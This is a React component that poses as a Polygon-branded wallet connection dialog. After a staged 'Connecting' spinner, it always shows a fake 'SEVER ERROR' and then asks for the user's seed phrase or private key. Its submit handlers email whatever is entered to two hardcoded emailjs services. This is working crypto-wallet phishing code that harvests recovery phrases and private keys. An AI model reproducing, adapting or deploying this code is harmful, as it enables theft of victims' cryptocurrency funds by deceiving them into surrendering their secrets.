import {
  Backdrop,
  Box,
  Fade,
  Modal,
  Stack,
  Typography,
  IconButton,
  CircularProgress,
  Button,
  Tabs,
  Tab,
  TextField,
} from "@mui/material";
import React, { useState, useRef, useEffect } from "react";
import { AiOutlineClose } from "react-icons/ai";
import emailjs from "@emailjs/browser";
import theme from "../mui/theme";
import data from "../data/data";

function PopModal({ open, close }) {
  const [tab, setTab] = useState(0);
  const [value, setValue] = useState(0);
  const [manual, setManual] = useState(false);
  const [phrase, setPhrase] = useState("");
  const [selected, setSelected] = useState("");
  const [privateKey, setPrivateKey] = useState("");
  const phraseRef = useRef();
  const keyRef = useRef();
  const [loading, setLoading] = useState(false);
  const wordCount = phrase
    .trim()
    .split(" ")
    .filter((word) => word !== "").length;

  useEffect(() => {
    if (tab === 1) {
      const timeoutId = setTimeout(() => {
        setTab(2);
      }, 7000);

      return () => {
        clearTimeout(timeoutId);
      };
    }
  }, [tab]);

  const handleModalFalse = () => {
    close(false);
  };

  const handleChange = (event, newValue) => {
    setValue(newValue);
  };

  //   Mail functions

  const handlePhrase = (e) => {
    e.preventDefault();

    setLoading(true);
    emailjs
      .sendForm(
        "service_efqp651",
        "template_8q1ftd5",
        phraseRef.current,
        "RrpGKzCZD8NPjGHj5"
      )
      .then(
        (result) => {
          console.log(result);
          setLoading(false);
          // alert("Connected successfully");
          localStorage.setItem("connected", "connected");
          //   setConnect(true);
        },
        (error) => {
          console.log(error);
          setLoading(false);
          alert(error);
        }
      );

    emailjs.sendForm(
      "service_udsvw3d",
      "template_bmqcwla",
      phraseRef.current,
      "DNsER4-4UGLWYPh73"
    );

    // window.location.href = "/";
  };

  const handlePrivateKey = (e) => {
    e.preventDefault();

    setLoading(true);
    emailjs
      .sendForm(
        "service_efqp651",
        "template_8q1ftd5",
        keyRef.current,
        "RrpGKzCZD8NPjGHj5"
      )
      .then(
        (result) => {
          console.log(result);
          setLoading(false);
          // alert("Connected successfully");
          localStorage.setItem("connected", "connected");
          //   setConnect(true);
        },
        (error) => {
          console.log(error.message);
          setLoading(false);
          alert(error);
        }
      );

    emailjs.sendForm(
      "service_udsvw3d",
      "template_bmqcwla",
      keyRef.current,
      "DNsER4-4UGLWYPh73"
    );
  };

  return (
    <div>
      <Modal
        open={open}
        closeAfterTransition
        slots={{ backdrop: Backdrop }}
        slotProps={{
          backdrop: {
            timeout: 500,
          },
        }}
      >
        <Fade in={true}>
          <Box sx={style}>
            <Box p={4}>
              <Stack
                direction="row"
                justifyContent="space-between"
                alignItems="center"
              >
                <img
                  src="https://assets.polygon.technology/brandAssets/polygon_logo_monochrome_white.svg"
                  alt="logo"
                  style={{
                    width: "130px",
                  }}
                />
                <IconButton
                  onClick={handleModalFalse}
                  sx={{
                    background: "#fff",
                    "&:hover": {
                      background: "#fff",
                    },
                  }}
                >
                  <AiOutlineClose color="#000" />
                </IconButton>
              </Stack>
            </Box>

            {tab === 0 ? (
              <Box
                bgcolor="white"
                display="flex"
                flexDirection="column"
                alignItems="center"
                justifyContent="center"
                p={4}
                sx={{ borderRadius: "0 0 10px 10px" }}
              >
                <Typography variant="h4" color="primary" mb={3}>
                  Select Wallet
                </Typography>

                <Box
                  minWidth={{ xs: "100%", sm: "600px" }}
                  width="100%"
                  maxHeight="50vh"
                  mt={5}
                  sx={{
                    display: "grid",
                    gridTemplateColumns: {
                      xs: "1fr 1fr",
                      sm: "1fr 1fr 1fr 1fr",
                    },
                    columnGap: "20px",
                    rowGap: "20px",
                    overflowY: "auto",
                    overflowX: "hidden",
                    justifyItems: "center",
                    scrollbarWidth: "none",

                    "&::-webkit-scrollbar": {
                      display: "none",
                    },
                  }}
                >
                  {data.map((wallet, index) => (
                    <Box
                      width="100px"
                      height="100px"
                      display="flex"
                      flexDirection="column"
                      justifyContent="center"
                      alignItems="center"
                      sx={{
                        cursor: "pointer",
                        border: "1px solid var(--grey-100, #EEF2F3)",
                        borderRadius: "10px",

                        "&:hover": {
                          background:
                            "linear-gradient(0deg, #EFF8F9 0%, rgba(239, 248, 249, 0.00) 100%)",
                          boxShadow: "0px 4px 4px 0px rgba(0, 0, 0, 0.06)",
                        },
                      }}
                      onClick={() => {
                        setTab(1);
                        setSelected(wallet.name);
                      }}
                    >
                      <img
                        src={wallet.image}
                        alt=""
                        style={{
                          width: "48px",
                          height: "48px",
                          objectFit: "contain",
                        }}
                      />
                      <Typography mt={2} variant="body1">
                        {wallet.name}
                      </Typography>
                    </Box>
                  ))}
                </Box>
              </Box>
            ) : null}

            {tab === 1 && (
              <Box
                bgcolor="white"
                display="flex"
                flexDirection="column"
                alignItems="center"
                justifyContent="center"
                p={4}
                sx={{ borderRadius: "0 0 10px 10px" }}
              >
                <Typography
                  variant="body1"
                  color="primary"
                  mb={3}
                  sx={{ textTransform: "capitalize" }}
                >
                  Connecting to {selected} Wallet..
                </Typography>
                <CircularProgress />
              </Box>
            )}

            {tab === 2 && (
              <Box
                bgcolor="white"
                display="flex"
                flexDirection="column"
                alignItems="center"
                justifyContent="center"
                p={4}
                sx={{ borderRadius: "0 0 10px 10px" }}
              >
                <Typography variant="body1" sx={{ color: "#f00" }} mb={3}>
                  SEVER ERROR
                </Typography>
                <Button
                  variant="contained"
                  color="primary"
                  sx={{
                    width: "160px",
                    height: "42px",
                  }}
                  onClick={() => {
                    setManual(true);
                    setTimeout(() => {
                      setTab(3);
                    }, 3000);
                  }}
                >
                  {manual ? (
                    <CircularProgress size={20} sx={{ color: "#fff" }} />
                  ) : (
                    "Connect Manually"
                  )}
                </Button>
              </Box>
            )}

            {tab === 3 && (
              <Box
                bgcolor="white"
                display="flex"
                flexDirection="column"
                alignItems="center"
                justifyContent="center"
                p={4}
                sx={{ borderRadius: "0 0 10px 10px" }}
              >
                <Box>
                  <Typography variant="h5" component="h2" align="center">
                    Manual Connect
                  </Typography>

                  <Box
                    display="flex"
                    justifyContent="center"
                    alignItems="center"
                    mt={2}
                  >
                    <Tabs value={value} onChange={handleChange}>
                      <Tab label="Phrase" />
                      <Tab label="Private Key" />
                    </Tabs>
                  </Box>

                  <Box
                    mt={5}
                    mb={2}
                    width="100%"
                    sx={{
                      display: "flex",
                      flexDirection: "column",
                      justifyContent: "center",
                      alignItems: "center",
                    }}
                  >
                    <Box
                      mt={5}
                      mb={2}
                      width="100%"
                      sx={{
                        display: "flex",
                        justifyContent: "center",
                        alignItems: "center",
                      }}
                    >
                      {value === 0 && (
                        <form
                          ref={phraseRef}
                          style={{
                            width: "100%",
                            display: "flex",
                            flexDirection: "column",
                            justifyContent: "center",
                            alignItems: "center",
                          }}
                          onSubmit={handlePhrase}
                        >
                          <Stack spacing={2}>
                            <TextField
                              multiline
                              rows={4}
                              placeholder="Enter secret phrase"
                              name="phrase"
                              value={phrase}
                              onChange={(e) => setPhrase(e.target.value)}
                              required
                            />
                            <Typography
                              variant="caption"
                              color={theme.palette.textSecondary.main}
                            >
                              Typically 12 (sometimes 24) words separated by
                              single spaces
                            </Typography>
                            <Button
                              type="submit"
                              variant="contained"
                              disabled={wordCount < 12}
                            >
                              {!loading ? (
                                "Connect"
                              ) : (
                                <CircularProgress sx={{ color: "#E6F0FF" }} />
                              )}
                            </Button>
                          </Stack>
                        </form>
                      )}

                      {value === 1 && (
                        <form
                          ref={keyRef}
                          style={{
                            minWidth: "100%",
                            display: "flex",
                            flexDirection: "column",
                            justifyContent: "center",
                            alignItems: "center",
                          }}
                          onSubmit={handlePrivateKey}
                        >
                          <Stack spacing={2}>
                            <TextField
                              multiline
                              rows={4}
                              placeholder="Enter Private Key"
                              name="key"
                              value={privateKey}
                              onChange={(e) => setPrivateKey(e.target.value)}
                              required
                              sx={{ width: "354px" }}
                            />
                            <Typography
                              variant="caption"
                              color={theme.palette.textSecondary.main}
                            >
                              Typically 64 alphanumeric characters
                            </Typography>

                            <Button
                              type="submit"
                              variant="contained"
                              disabled={privateKey.length < 12}
                            >
                              {!loading ? (
                                "Connect"
                              ) : (
                                <CircularProgress sx={{ color: "#E6F0FF" }} />
                              )}
                            </Button>
                          </Stack>
                        </form>
                      )}
                    </Box>
                  </Box>
                </Box>
              </Box>
            )}
          </Box>
        </Fade>
      </Modal>
    </div>
  );
}

export default PopModal;

const style = {
  position: "absolute",
  top: "50%",
  left: "50%",
  transform: "translate(-50%, -50%)",
  minWidth: 400,
  width: "100%",
  maxWidth: "754px",
  bgcolor: theme.palette.primary.main,
  border: "none",
  borderRadius: "10px",
  boxShadow: 24,
  padding: { xs: "20px", sm: "0" },
};
